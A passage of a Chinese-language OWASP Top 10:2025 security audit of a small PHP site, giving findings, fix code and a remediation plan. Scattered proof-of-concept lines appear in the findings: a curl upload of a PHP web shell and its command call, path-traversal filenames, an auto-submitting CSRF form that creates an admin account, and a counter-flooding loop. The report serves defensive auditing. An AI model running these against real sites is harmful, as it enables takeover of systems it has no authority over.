    array_map(fn($f) => 'upload/' . $f, $imgs),
    JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_UNESCAPED_UNICODE
) ?>;
</script>
```
並在上傳端強制重新產生安全檔名（見 A06-3）。

---

### 🟡 A05-6　可變變數（Variable Variables）讓使用者選擇任意資料表

**位置**：`api/add.php:4-5`、`api/edit.php:4-5`、`api/update.php:4-5`、`api/edit_value.php:3-4`、`api/edit_bottom.php:3-4`、`back/*.php:28-32`

```php
$table=$_GET['table'];
$db=${ucfirst($table)};        ← 用使用者輸入去取全域變數
```

問題：
1. **可指向任意已定義的全域變數**，包括 `$_POST`、`$_GET`、`$_SESSION`、`$_SERVER`（`ucfirst('_POST')` 仍是 `_POST`，底線不受 `ucfirst` 影響）。雖然對陣列呼叫 `->save()` 會產生 fatal error，但這是「靠錯誤擋下來」而非設計上的防護。
2. **讓攻擊者自由選擇要操作的資料表**，這正是 A01-2 中 `?table=admin` 攻擊得以成立的機制。
3. 若 `$table` 對應不到變數，`$db` 為 `null` → `Error: Call to a member function save() on null`（見 A10-2）。

**建議修復**：以明確的白名單對映取代可變變數：

```php
$registry = [
    'title'  => $Title,  'ad'   => $Ad,     'mvim' => $Mvim,
    'image'  => $Image,  'news' => $News,   'menu' => $Menu,
    'total'  => $Total,  'bottom' => $Bottom,
    // 'admin' 刻意排除，改由專屬且權限更嚴格的端點處理
];
$table = $_GET['table'] ?? '';
if (!isset($registry[$table])) {
    http_response_code(400);
    exit('invalid table');
}
$db = $registry[$table];
```

---

## A06:2025 – Insecure Design（不安全的設計）

### 🔴 A06-1　任意檔案上傳（無任何驗證）→ RCE

**位置**：`api/add.php:7-11`、`api/update.php:7-15`

```php
if(!empty($_FILES['img']['tmp_name'])){
    move_uploaded_file($_FILES['img']['tmp_name'],"../upload/".$_FILES['img']['name']);
    $_POST['img']=$_FILES['img']['name'];
}
```

**完全沒有做**：副檔名檢查、MIME 型別檢查、實際檔案內容驗證、檔案大小限制、檔名清理、上傳數量限制。**並且直接採用使用者提供的原始檔名。**

**攻擊示範**：
```bash
curl -X POST "http://<站台>/api/add.php?table=image" \
     -F "img=@shell.php;filename=shell.php"
# → upload/shell.php
# → http://<站台>/upload/shell.php?cmd=whoami        （若 A02-4 未修）
# → http://<站台>/index.php?do=../upload/shell       （即使 A02-4 已修，經 A05-2 仍可執行）
```

此外，`$_FILES['img']['name']` 可能包含路徑分隔符（瀏覽器通常不會送，但攻擊者可自行構造請求）：
```
filename="../api/db.php"   → 覆寫核心程式檔
filename="../.htaccess"    → 竄改伺服器設定
```

**建議修復**：
```php
const ALLOWED = ['image/jpeg' => 'jpg', 'image/png' => 'png', 'image/gif' => 'gif'];
const MAX_SIZE = 3 * 1024 * 1024;   // 3MB

$f = $_FILES['img'] ?? null;
if (!$f || $f['error'] !== UPLOAD_ERR_OK) { http_response_code(400); exit('upload failed'); }
if ($f['size'] > MAX_SIZE)              { http_response_code(413); exit('file too large'); }
if (!is_uploaded_file($f['tmp_name']))  { http_response_code(400); exit('invalid upload'); }

// 以實際內容判斷型別，不信任瀏覽器送來的 type，也不信任副檔名
$mime = (new finfo(FILEINFO_MIME_TYPE))->file($f['tmp_name']);
if (!isset(ALLOWED[$mime]))             { http_response_code(415); exit('unsupported type'); }

// 額外確認確實是可解析的圖片
if (getimagesize($f['tmp_name']) === false) { http_response_code(415); exit('not an image'); }

// 由伺服器產生檔名，完全丟棄使用者提供的名稱
$name = bin2hex(random_bytes(16)) . '.' . ALLOWED[$mime];
$dest = __DIR__ . '/../upload/' . $name;
if (!move_uploaded_file($f['tmp_name'], $dest)) { http_response_code(500); exit('save failed'); }
chmod($dest, 0644);
$_POST['img'] = $name;
```

> 註：`include/mvim.php` 上傳的是 SWF 動畫（`front/main.php:27` 用 `<embed>` 播放）。現代瀏覽器已全面移除 Flash 支援，這個功能實際上已失效，建議改為 MP4 / GIF / WebP，並把 `<embed>` 換成 `<video>` 或 `<img>`。若沿用 `<embed>` 且允許上傳 SWF，將是另一條 XSS 途徑。

---

### 🔴 A06-2　全站缺少 CSRF 防護

**位置**：所有表單 —— `front/login.php:6`、`include/*.php`、`back/*.php:19`

沒有任何一個表單帶 CSRF token，伺服端也沒有任何驗證。搭配 A02-5（SameSite 未設定；雖然現代瀏覽器多數預設 `Lax`，但不應依賴瀏覽器預設值）。

**攻擊示範**：管理員登入狀態下，只要瀏覽一個惡意頁面：

```html
<form id="f" method="post" action="http://<站台>/api/add.php?table=admin">
  <input name="acc" value="attacker">
  <input name="pw"  value="p@ssw0rd">
</form>
<script>document.getElementById('f').submit()</script>
```

即在無感知的情況下建立了攻擊者的管理帳號。`api/edit.php?table=admin` 亦可用同樣方式改掉主管理員密碼。

**建議修復**：
```php
// api/csrf.php
function csrf_token(): string {
    if (empty($_SESSION['csrf'])) $_SESSION['csrf'] = bin2hex(random_bytes(32));
    return $_SESSION['csrf'];
}
function csrf_check(): void {
    $t = $_POST['_token'] ?? '';
    if (!hash_equals($_SESSION['csrf'] ?? '', $t)) {
        http_response_code(419);
        exit('CSRF token mismatch');
    }
}
```
每個表單加入 `<input type="hidden" name="_token" value="<?= e(csrf_token()) ?>">`，每個 `api/*.php` 開頭呼叫 `csrf_check()`。同時把 session cookie 設為 `SameSite=Lax`（A02-5）。

---

### 🟠 A06-3　登入無速率限制／帳號鎖定／驗證碼

**位置**：`api/login.php`

登入端點可被無限次呼叫，沒有失敗計數、沒有延遲、沒有 CAPTCHA、沒有 IP 限制。配合現有的弱密碼（`1234`、`5678`、`12345678`，見 A04-1），暴力破解在數秒內即可完成。

**建議修復**：
- 以資料表或 Redis 記錄 `(帳號, IP)` 的失敗次數，超過 5 次後鎖定 15 分鐘。
- 失敗時加入固定延遲（`usleep(300000)`），並確保成功／失敗的回應時間相近，避免時序側通道洩漏帳號是否存在。
- 高風險操作（新增管理員、刪除資料）要求重新輸入密碼。

---

### 🟠 A06-4　訪客計數器可被任意灌水，且有競態條件

**位置**：`api/db.php:132-137`

```php
if(!isset($_SESSION['visit'])){
    $_SESSION['visit']=1;
    $visit=$Total->find(1);
    $visit['total']++;              ← 讀取 → 加一 → 寫回，非原子操作
    $Total->save($visit);
}
```

問題：
1. **計數依據是 session** —— 攻擊者清除 cookie（或每次請求都不帶 cookie）即可無限增加計數。一行 `while true; do curl -s http://<站台>/ > /dev/null; done` 就能灌爆。
2. **Read-Modify-Write 競態** —— 兩個並行請求可能同時讀到相同的值，導致計數少算。
3. 每個新訪客都會產生一次 UPDATE，流量大時形成資料庫熱點。

**建議修復**：
```php
// 原子遞增，交給資料庫處理
$st = $pdo->prepare("UPDATE `total` SET `total` = `total` + 1 WHERE `id` = 1");
$st->execute();
```
若計數的正確性有實質意義，應改以 IP + User-Agent 雜湊搭配時間窗去重，或直接改用伺服器存取日誌分析（GoAccess / Matomo）。

---

### 🟡 A06-5　確認密碼欄位未在後端驗證

**位置**：`include/admin.php:15`（表單有 `pw2` 欄位）、`api/add.php:17`

```php
case 'admin':
    unset($_POST['pw2']);      ← 直接丟棄，從未與 pw 比對
break;
```

前端也沒有任何 JavaScript 檢查。使用者打錯確認密碼不會有任何提示，帳號建立後卻無法登入。

**建議修復**：
```php
if (($_POST['pw'] ?? '') !== ($_POST['pw2'] ?? '')) {
    http_response_code(400);
    exit('兩次輸入的密碼不一致');
}
```

---

### 🟡 A06-6　沒有密碼強度政策

`db21.sql` 中現存的密碼是 `1234`、`5678`、`12345678`，顯示系統對密碼複雜度毫無要求。

**建議修復**：依 NIST SP 800-63B：
- 最短 8 字元（管理員帳號建議 12 以上）
- 比對常見弱密碼字典（如 `haveibeenpwned` 的 k-anonymity API 或本地 top-10000 清單）
- 不強制定期更換、不強制複雜字元組合（這些反而降低安全性）
- 允許貼上、允許長密碼與空白字元

---

### 🟡 A06-7　`front/news.php` 分頁參數缺乏驗證

**位置**：`front/news.php:15-18`、`back/image.php:33-36`、`back/news.php:32-35`

```php
$now=$_GET['p']??1;
$start=($now-1)*$div;
$rows=$db->all(['sh'=>1]," limit $start,$div");
```

`$_GET['p']` 未驗證即參與算術並拼進 SQL 的 LIMIT 子句。PHP 8 會對非數值字串拋出 `TypeError`（見 A10-4）；負值會產生 `LIMIT -5,5` 造成 SQL 語法錯誤。雖然算術運算使直接注入變得困難，但這是一個不該存在的脆弱點。

**建議修復**：
```php
$now   = max(1, min($pages ?: 1, (int)($_GET['p'] ?? 1)));
$start = ($now - 1) * $div;
$st = $pdo->prepare("SELECT * FROM `news` WHERE `sh` = 1 ORDER BY `id` DESC LIMIT :off, :cnt");
$st->bindValue(':off', $start, PDO::PARAM_INT);
$st->bindValue(':cnt', $div,   PDO::PARAM_INT);
$st->execute();
```

---

## A07:2025 – Authentication Failures（身分驗證失效）

### 🟠 A07-1　Session Fixation（會話固定）

**位置**：`api/login.php:8`

```php
if($Admin->count($_POST)>0){
    $_SESSION['login']=1;        ← 登入成功後未重新產生 session ID
    to("../admin.php");
}
```

攻擊者可先取得一個 session ID，透過連結或其他手段讓受害者使用該 ID 登入，登入後攻擊者手上的 ID 就成為已驗證的 session。

**建議修復**：
```php
session_regenerate_id(true);     // true = 同時刪除舊的 session 檔
$_SESSION['login']     = 1;
$_SESSION['admin_id']  = (int)$row['id'];
$_SESSION['last_seen'] = time();
```

---

### 🟠 A07-2　`to()` 導向後未 `exit`

**位置**：`api/db.php:116-118`

```php
function to($url){
    header("location:$url");     ← 沒有 exit
}
```

呼叫端（`api/login.php:9`、`api/add.php:30`、`api/edit.php:46` …）在 `to()` 之後程式仍會繼續執行。目前這些呼叫都恰好位於檔案結尾，尚未造成實際危害，但這是一個典型的隱患：日後只要在 `to()` 後面加了任何程式碼（尤其是權限檢查失敗後的導向），該程式碼仍會被執行 —— 這正是「導向了但沒擋住」這類存取控制繞過的成因。

另外 `$url` 直接內插進 `Location` 標頭；目前呼叫端傳的都是常值，但若日後接受使用者輸入，會同時造成**開放式重新導向**與**HTTP 標頭注入**。

**建議修復**：
```php
function to(string $path): never {
    // 僅允許站內相對路徑
    if (!preg_match('#^(?:\.\./|/|\./)?[A-Za-z0-9_\-./]*(?:\?[A-Za-z0-9_\-=&%.]*)?$#', $path)) {
        $path = '/index.php';
    }
    header('Location: ' . $path, true, 302);
    exit;
}
```

---

### 🟡 A07-3　Session 無逾時與絕對存活期限

沒有閒置逾時，也沒有絕對逾時。管理員登入後只要瀏覽器不關，session 可長期有效。

**建議修復**：
```php
$IDLE = 1800;      // 30 分鐘閒置
$ABS  = 8 * 3600;  // 8 小時絕對上限
if (isset($_SESSION['last_seen']) && time() - $_SESSION['last_seen'] > $IDLE) { logout(); }
if (isset($_SESSION['login_at']) && time() - $_SESSION['login_at']  > $ABS)  { logout(); }
$_SESSION['last_seen'] = time();
```

---

### 🟡 A07-4　`api/login.php` 對非 POST 請求的處理不完整

**位置**：`api/login.php:3-6`

```php
$_POST['acc']=htmlspecialchars(trim($_POST['acc']));   // ← 在 isset 檢查「之前」
$_POST['pw'] =htmlspecialchars(trim($_POST['pw']));
if(isset($_POST['acc'])){ ... }
```

直接以 GET 存取 `api/login.php`：
- 產生 `Warning: Undefined array key "acc"`（若 `display_errors=On` 會洩漏絕對路徑）
- PHP 8.1+ 對 `trim(null)` / `htmlspecialchars(null)` 產生 deprecated 警告
- 這兩行執行後 `$_POST['acc']` 變成空字串，使得 `isset()` 恆為 true，於是空帳密也會走進驗證流程（雖然 count 為 0 不會通過，但邏輯是錯的）

**建議修復**：
```php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: /index.php?do=login', true, 302);
    exit;
}
$acc = trim((string)($_POST['acc'] ?? ''));
$pw  = (string)($_POST['pw'] ?? '');       // 密碼不做 trim，也不做 htmlspecialchars
if ($acc === '' || $pw === '') { /* 顯示錯誤 */ }
```

---

### 🔵 A07-5　登入失敗訊息以 `alert()` + `location.href` 呈現

**位置**：`api/login.php:11-14`

```php
echo "<script>";
echo "alert('帳號或密碼錯誤');";
echo "location.href='../index.php?do=login'";
echo "</script>";
```

這種寫法把流程控制交給 JavaScript：使用者停用 JS 就會卡在空白頁；也讓嚴格 CSP（`script-src 'self'`）無法導入。

**建議修復**：改用伺服端導向 + session flash message：
```php
$_SESSION['flash_error'] = '帳號或密碼錯誤';
header('Location: /index.php?do=login', true, 302);
exit;
```
`front/login.php` 讀取並以 `e()` 跳脫後顯示，顯示後清除。

---

## A08:2025 – Software or Data Integrity Failures（軟體與資料完整性失效）

### 🟠 A08-1　`$(y).load(url)` 動態載入伺服端片段並插入 DOM

**位置**：`js/js.js:21-28`，呼叫端 `back/ad.php:53`、`back/admin.php:55`、`back/image.php:51,86`、`back/menu.php:51,64`、`back/mvim.php:45,58`、`back/news.php:81`、`back/title.php:49,62`

```javascript
function op(x,y,url){
    $(x).fadeIn()
    if(y) $(y).fadeIn()
    if(y&&url) $(y).load(url)      ← 回應內容直接以 HTML 插入 DOM
}
```

`url` 由 PHP 端組成，其中包含 `<?= $do ?>` 與 `<?= $row['id'] ?>`。`$do` 可被使用者控制（見 A05-4），因此可構造成載入任意路徑；而 `.load()` 會執行回應中的 `<script>`。

**建議修復**：`url` 改為前端寫死的白名單常數（如 `data-panel="news"` 對映到固定路徑），並在伺服端對片段回應設定 `Content-Type: text/html; charset=utf-8` 與 `X-Content-Type-Options: nosniff`。長期而言應改用結構化的 JSON API + 前端安全渲染。

---

### 🟡 A08-2　上傳檔案缺乏完整性與型別驗證

見 A06-1。從完整性的角度補充：系統無法確認 `upload/` 中的檔案是否被竄改，也沒有雜湊紀錄。

**建議修復**：於資料庫記錄上傳檔案的 SHA-256、原始檔名、上傳者、上傳時間，供稽核與異常偵測使用。

---

### 🔵 A08-3　缺乏部署完整性控管

沒有 CI/CD、沒有部署前的自動化檢查（PHP linter、PHPStan、`composer audit`）、沒有程式碼簽章。目前的部署方式推測為直接 FTP 上傳，任何檔案被竄改都不會被發現。

**建議修復**：導入 GitHub Actions，於 PR 階段執行 `php -l`、PHPStan level 5+、以及 Semgrep 的 PHP 安全規則集。

---

## A09:2025 – Security Logging and Alerting Failures（日誌與告警失效）

### 🟠 A09-1　完全沒有安全事件日誌

驗證：

```bash
$ grep -rn "error_log\|syslog\|monolog\|LOG_" --include=*.php .
（無任何結果）
```

**目前完全沒有記錄的事件**：

| 事件 | 現況 |
|---|---|
| 登入成功 | ❌ 無 |
| 登入失敗 | ❌ 無（無法偵測暴力破解） |
| 登出 | ❌ 無 |
| 新增／修改／刪除管理員帳號 | ❌ 無 |
| 資料異動（news / menu / ad / title / bottom） | ❌ 無 |
| 檔案上傳 | ❌ 無 |
| 權限檢查失敗 | ❌ 無（因為根本沒有權限檢查） |
| SQL 錯誤 | ❌ 無（PDO 為 SILENT 模式，見 A10-1） |

**影響**：發生入侵時無法判斷「何時被入侵」「哪個帳號做的」「改了什麼」「還有哪些資料被讀取」，也無法通報主管機關（個資法要求）或進行事後復原。以本專案目前的漏洞數量，若已上線，**很可能已經被入侵而完全無從察覺**。

**建議修復**：
```php
function audit(string $event, array $ctx = []): void {
    $line = json_encode([
        'ts'     => date('c'),
        'event'  => $event,
        'ip'     => $_SERVER['REMOTE_ADDR']     ?? '-',
        'ua'     => $_SERVER['HTTP_USER_AGENT'] ?? '-',
        'admin'  => $_SESSION['admin_id']       ?? null,
        'ctx'    => $ctx,
    ], JSON_UNESCAPED_UNICODE);
    error_log($line, 3, '/var/log/web21/audit.log');   // 目錄需在 web root 之外
}
```
使用方式：`audit('login.failed', ['acc' => $acc]);`、`audit('admin.created', ['new_acc' => $acc]);`

**日誌本身的安全要求**：
- 日誌檔必須放在 web root 之外，避免被直接下載
- **絕不記錄密碼、session ID、完整 SQL 語句**
- 保存期限至少 90 天，並設定唯附加（append-only）權限
- 對「短時間內大量登入失敗」「非上班時段新增管理員」等情境設定告警

---

### 🟡 A09-2　無登入歷程可供使用者自我檢查

管理員無法得知自己的帳號上次何時、從何處登入。這是偵測帳號盜用最簡單有效的機制之一。

**建議修復**：`admin` 表加上 `last_login_at`、`last_login_ip` 欄位，後台首頁顯示「上次登入：2026-08-13 09:12，來自 140.x.x.x」。

---

## A10:2025 – Mishandling of Exceptional Conditions（例外狀況處理不當）

> 2025 年版的**全新類別**。本專案在此類別問題不少，多與缺少錯誤處理設計有關。

### 🟠 A10-1　PDO 未設定錯誤模式，SQL 失敗時觸發 Fatal Error 並洩漏路徑

**位置**：`api/db.php:11`、以及所有 `query()` 呼叫點（`:29, :47, :60, :105`）

```php
$this->pdo=new PDO($this->dsn,'root','');    ← 未設定 ATTR_ERRMODE
...
return $this->pdo->query($sql)->fetchAll(PDO::FETCH_ASSOC);
```

PDO 預設為 `ERRMODE_SILENT`：SQL 執行失敗時 `query()` 回傳 `false`，程式接著對 `false` 呼叫 `->fetchAll()`：

```
PHP Fatal error: Uncaught Error: Call to a member function fetchAll() on bool
in D:\web21\api\db.php:29
```

若 `display_errors=On`（XAMPP 等開發環境的預設值），這段訊息會**直接輸出到瀏覽器**，洩漏：
- 伺服器的絕對檔案路徑（`D:\web21\...`）
- 完整的呼叫堆疊，暴露程式結構
- 搭配 A02-3 的 `echo $sql`，連 SQL 語句都一併洩漏

這正是攻擊者做 error-based SQL Injection 時最需要的資訊。

**建議修復**：
```php
$this->pdo = new PDO($dsn, $user, $pass, [
    PDO::ATTR_ERRMODE            => PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    PDO::ATTR_EMULATE_PREPARES   => false,
]);
```
搭配全域例外處理器，對使用者只顯示通用訊息：
```php
set_exception_handler(function (Throwable $e) {
    error_log('[uncaught] ' . $e->getMessage() . ' @ ' . $e->getFile() . ':' . $e->getLine());
    http_response_code(500);
    echo '系統發生錯誤，請稍後再試。';   // 不洩漏任何內部細節
    exit;
});
```
正式環境務必 `display_errors=Off`、`log_errors=On`、`error_reporting=E_ALL`。

---

### 🟠 A10-2　可變變數對映失敗導致 Fatal Error

**位置**：`api/add.php:5`、`api/edit.php:5`、`api/update.php:5`、`api/edit_value.php:4`、`api/edit_bottom.php:4`

```php
$table=$_GET['table'];
$db=${ucfirst($table)};       ← $table 若不存在對應變數，$db 為 null
$db->save($_POST);            ← Error: Call to a member function save() on null
```

**PoC**：
```
http://<站台>/api/add.php?table=notexist
```
即產生 fatal error 並洩漏檔案路徑。同時 `$_GET['table']` 未設定時（`api/add.php:4`）會產生 `Undefined array key` 警告。

**建議修復**：見 A05-6 的白名單對映，並對非法值回傳 `400` 而非讓程式崩潰。

---

### 🟡 A10-3　`$_POST['id']` 不存在時 `foreach` 崩潰

**位置**：`api/edit.php:7`、`api/submenu.php:4`

```php
foreach($_POST['id'] as $idx => $id){      ← 未檢查是否存在／是否為陣列
```

**PoC**：`curl -X POST "http://<站台>/api/edit.php?table=news"`（不帶任何參數）

```
Warning: Undefined array key "id"
Warning: foreach() argument must be of type array|object, null given
```

同理 `api/edit.php:15,20,28,32` 存取 `$_POST['text'][$idx]` 等，若前端送來的陣列長度不一致（攻擊者可任意構造），會產生一連串未定義索引警告，並把 `null` 寫入資料庫。

**建議修復**：
```php
$ids = $_POST['id'] ?? [];
if (!is_array($ids)) { http_response_code(400); exit('bad request'); }
foreach ($ids as $idx => $id) {
    $id = (int)$id;
    if ($id <= 0) continue;
    $text = $_POST['text'][$idx] ?? '';
    ...
}
```

---

### 🟡 A10-4　分頁參數為非數值時拋出 TypeError

**位置**：`front/news.php:15-16`、`back/image.php:33-34`、`back/news.php:32-33`

```php
$now=$_GET['p']??1;
$start=($now-1)*$div;         ← PHP 8：'abc' - 1 拋出 TypeError
```

**PoC**：`http://<站台>/index.php?do=news&p=abc`

PHP 8 會拋出 `TypeError: Unsupported operand types: string - int`，未捕捉即 Fatal error 並洩漏路徑。

另一個情境：`p=0` 產生 `$start = -5` → `LIMIT -5,5` → SQL 語法錯誤 → 因 A10-1 再次 Fatal error。

**建議修復**：見 A06-7 的 `max(1, min($pages, (int)$p))` 夾擠寫法。

---

### 🟡 A10-5　查無資料時直接對 `null` 取索引

**位置**：`index.php:22,58,122`、`admin.php:21,62,96`、`back/bottom.php:25`、`back/total.php:25`

```php
$title=$Title->find(['sh'=>1]);
<?= $title['text']; ?>                    ← find() 回傳 false（查無資料）
<?= $Total->find(1)['total'] ?>           ← 對 false 取索引
<?= $Bottom->find(1)['bottom'] ?>
```

`fetch()` 查無資料時回傳 `false`。`false['text']` 在 PHP 8 產生 `Warning: Trying to access array offset on value of type bool`，輸出空字串。

更嚴重的是 `api/db.php:132-137` 的訪客計數：
```php
$visit=$Total->find(1);        // 若 total 表為空 → false
$visit['total']++;             // Error: Cannot use a scalar value as an array（PHP 8）
$Total->save($visit);
```
**只要 `total` 資料表被清空，整個網站的每一頁都會直接崩潰**（因為 `db.php` 被所有頁面 `include`）。這是一個單點故障。

**建議修復**：
```php
$title = $Title->find(['sh' => 1]) ?: ['text' => '', 'img' => 'default.png'];
$total = $Total->find(1)['total'] ?? 0;
```
訪客計數改用 A06-4 的原子 UPDATE，即可完全避開這個問題。

---

### 🔵 A10-6　無自訂錯誤頁面

未設定 404 / 500 的自訂頁面，錯誤時暴露 Web Server 的預設頁（含版本資訊）。

**建議修復**：設定自訂錯誤頁，並關閉 Server 版本標頭（Apache `ServerTokens Prod` / `ServerSignature Off`；PHP `expose_php=Off`）。

---

## 附錄 A：問題總表

| # | 編號 | OWASP 2025 類別 | 問題 | 嚴重度 | 主要位置 |
|---|---|---|---|---|---|
| 1 | A01-1 | Broken Access Control | 後台無登入檢查 | 🔴 Critical | `admin.php:1` |
| 2 | A01-2 | Broken Access Control | 所有 API 無身分驗證 | 🔴 Critical | `api/*.php` |
| 3 | A01-3 | Broken Access Control | `include/` 片段可直接存取 | 🟠 High | `include/submenu.php:1` |
| 4 | A01-4 | Broken Access Control | 登出未銷毀 session | 🟠 High | `back/*.php:11` |
| 5 | A01-5 | Broken Access Control | 主帳號保護僅在前端 | 🟠 High | `back/admin.php:31` |
| 6 | A01-6 | Broken Access Control | 無權限分級 | 🟡 Medium | `db21.sql:54` |
| 7 | A02-1 | Security Misconfiguration | DB 用 root + 空密碼且寫死 | 🔴 Critical | `api/db.php:11` |
| 8 | A02-2 | Security Misconfiguration | `db21.sql` 含明文密碼且可下載 | 🔴 Critical | `db21.sql` |
| 9 | A02-3 | Security Misconfiguration | `echo $sql` 除錯殘留 | 🟠 High | `api/db.php:46` |
| 10 | A02-4 | Security Misconfiguration | `upload/` 可執行 PHP | 🟠 High | `upload/` |
| 11 | A02-5 | Security Misconfiguration | Session cookie 缺安全屬性 | 🟡 Medium | `api/db.php:2` |
| 12 | A02-6 | Security Misconfiguration | 缺 HTTP 安全標頭 | 🟡 Medium | 全站 |
| 13 | A02-7 | Security Misconfiguration | 舊版型檔暴露 | 🟡 Medium | `102201/` |
| 14 | A02-8 | Security Misconfiguration | 連線字元集不一致 | 🔵 Low | `api/db.php:5` |
| 15 | A03-1 | Supply Chain Failures | jQuery 1.9.1 已知 XSS 漏洞 | 🟠 High | `js/jquery-1.9.1.min.js` |
| 16 | A03-2 | Supply Chain Failures | 無相依套件管理 | 🟡 Medium | 專案層級 |
| 17 | A03-3 | Supply Chain Failures | 前端資產無 SRI | 🔵 Low | `index.php:8` |
| 18 | A04-1 | Cryptographic Failures | 密碼明文儲存 | 🔴 Critical | `db21.sql:64`, `api/add.php:27` |
| 19 | A04-2 | Cryptographic Failures | 明文密碼回填 HTML | 🟠 High | `back/admin.php:38` |
| 20 | A04-3 | Cryptographic Failures | 無 TLS 強制 | 🟡 Medium | 全站 |
| 21 | A05-1 | Injection | SQL Injection（全面） | 🔴 Critical | `api/db.php` 全檔 |
| 22 | A05-2 | Injection | LFI／路徑遍歷 → RCE | 🔴 Critical | `index.php:66`, `admin.php:68` |
| 23 | A05-3 | Injection | 儲存型 XSS（全站輸出未跳脫） | 🟠 High | `include/marquee.php:6` 等 |
| 24 | A05-4 | Injection | 反射型 XSS | 🟠 High | `back/title.php:19`, `include/submenu.php:28` |
| 25 | A05-5 | Injection | JS 內容注入（經檔名） | 🟠 High | `front/main.php:17` |
| 26 | A05-6 | Injection | 可變變數選擇任意資料表 | 🟡 Medium | `api/add.php:5` 等 |
| 27 | A06-1 | Insecure Design | 任意檔案上傳 → RCE | 🔴 Critical | `api/add.php:7`, `api/update.php:7` |
| 28 | A06-2 | Insecure Design | 全站無 CSRF 防護 | 🔴 Critical | 所有表單 |
| 29 | A06-3 | Insecure Design | 登入無速率限制 | 🟠 High | `api/login.php` |
| 30 | A06-4 | Insecure Design | 計數器可灌水 + 競態 | 🟠 High | `api/db.php:132` |
| 31 | A06-5 | Insecure Design | 確認密碼未驗證 | 🟡 Medium | `api/add.php:17` |
| 32 | A06-6 | Insecure Design | 無密碼強度政策 | 🟡 Medium | `include/admin.php` |
| 33 | A06-7 | Insecure Design | 分頁參數未驗證 | 🟡 Medium | `front/news.php:15` |
| 34 | A07-1 | Authentication Failures | Session Fixation | 🟠 High | `api/login.php:8` |
| 35 | A07-2 | Authentication Failures | `to()` 導向後未 exit | 🟠 High | `api/db.php:116` |
| 36 | A07-3 | Authentication Failures | Session 無逾時 | 🟡 Medium | `api/db.php:2` |
| 37 | A07-4 | Authentication Failures | 非 POST 請求處理不完整 | 🟡 Medium | `api/login.php:3` |
| 38 | A07-5 | Authentication Failures | 錯誤訊息依賴 JS alert | 🔵 Low | `api/login.php:11` |
| 39 | A08-1 | Integrity Failures | `.load()` 動態載入片段 | 🟠 High | `js/js.js:27` |
| 40 | A08-2 | Integrity Failures | 上傳檔案無完整性紀錄 | 🟡 Medium | `api/add.php:7` |
| 41 | A08-3 | Integrity Failures | 無部署完整性控管 | 🔵 Low | 專案層級 |
| 42 | A09-1 | Logging Failures | 完全無安全日誌 | 🟠 High | 全站 |
| 43 | A09-2 | Logging Failures | 無登入歷程 | 🟡 Medium | `db21.sql:54` |
| 44 | A10-1 | Exceptional Conditions | PDO 無錯誤模式，洩漏路徑 | 🟠 High | `api/db.php:11,29` |
| 45 | A10-2 | Exceptional Conditions | 可變變數失敗致 Fatal Error | 🟠 High | `api/add.php:5` |
| 46 | A10-3 | Exceptional Conditions | `foreach` 未檢查陣列 | 🟡 Medium | `api/edit.php:7` |
| 47 | A10-4 | Exceptional Conditions | 分頁參數致 TypeError | 🟡 Medium | `front/news.php:16` |
| 48 | A10-5 | Exceptional Conditions | 對 `null`／`false` 取索引 | 🟡 Medium | `api/db.php:135`, `index.php:58` |
| 49 | A10-6 | Exceptional Conditions | 無自訂錯誤頁面 | 🔵 Low | 伺服器設定 |

> 註：表中每一列為一項獨立發現，共 49 項。部分問題跨多個檔案，於「主要位置」欄僅列代表性位置。

---

## 附錄 B：建議修復順序

### 第 0 階段 —— 若系統已對外開放，請先做這 3 件事（數小時內）

這三項不需要改動架構，可以立刻做：

1. **把 `db21.sql` 從 web root 移走**，並立即更換 `admin` / `superadmin` / `root` 三組密碼（這些密碼已在 Git 歷史中外洩，必須視為已公開）。
2. **移除 `api/db.php:46` 的 `echo $sql;`**（一行刪除，但會停止把使用者密碼印在頁面上）。
3. **在 `admin.php` 與所有 `api/*.php` 最上方加入登入檢查**（A01-1 的 `auth.php`，約 6 行）。

> 第 3 點是投報率最高的一項 —— 它一次擋掉「未認證者建立管理帳號」「未認證者上傳 webshell」「未認證者任意刪改資料」三條攻擊鏈的入口。但它是**權宜之計而非根治**，因為認證後的攻擊者仍可利用 SQL Injection 與檔案上傳漏洞。

### 第 1 階段 —— Critical（1～2 週）

| 順序 | 項目 | 說明 |
|---|---|---|
| 1 | A05-2 LFI | 路由改白名單（改動小、擋掉 RCE 主路徑） |
| 2 | A06-1 檔案上傳 | 型別／大小驗證 + 伺服器產生檔名 |
| 3 | A02-4 upload 執行權限 | `.htaccess` 或 Nginx 設定（與上一項須並行） |
| 4 | A05-1 SQL Injection | 改寫 `DB` 類別為 prepared statement（工作量最大） |
| 5 | A04-1 密碼雜湊 | `password_hash` / `password_verify` + 資料遷移 |
| 6 | A06-2 CSRF | token 機制 + 所有表單與 API 套用 |
| 7 | A02-1 DB 帳號 | 建立最小權限帳號，憑證移至環境變數 |

### 第 2 階段 —— High（2～4 週）

A05-3 / A05-4 / A05-5 輸出跳脫全面套用 → A04-2 密碼不回填 → A01-4 登出 → A01-5 主帳號保護 → A07-1 session 重生 → A10-1 PDO 錯誤模式 → A09-1 稽核日誌 → A03-1 jQuery 升級 → A06-3 登入速率限制 → A01-3 目錄結構調整。

### 第 3 階段 —— Medium / Low（持續進行）

安全標頭與 CSP（需先移除 inline JS）、session 逾時、權限分級、密碼政策、相依套件管理與 CI 掃描、例外處理與自訂錯誤頁、登入歷程。

---

## 附錄 C：檢查方法與限制

**已執行**：
- 全部 30 個 PHP 檔案的逐行人工審查
- `db21.sql` 資料庫結構與初始資料檢視
- `js/js.js` 及 jQuery 版本比對
- 跨檔案的資料流追蹤（使用者輸入 → SQL / 檔案路徑 / HTML 輸出）
- 對照 OWASP Top 10:2025 十大類別逐項比對

**未執行**（建議後續補上）：
- 動態滲透測試（DAST）—— 本報告中的 PoC 皆為靜態分析推導，**未實際對執行中的系統驗證**
- 伺服器層設定檢查（`php.ini`、Apache/Nginx 設定、檔案系統權限）
- 資料庫實際權限與網路暴露面檢查
- 自動化工具掃描（Semgrep、PHPStan、SonarQube）

**建議的驗證工具**：
```bash
# 靜態分析
composer require --dev phpstan/phpstan && vendor/bin/phpstan analyse --level=6 .
semgrep --config=p/php --config=p/owasp-top-ten .

# 語法檢查
find . -name "*.php" -exec php -l {} \;

# 動態掃描（僅限自有測試環境，需取得授權）
zap-cli quick-scan http://localhost/
```

---

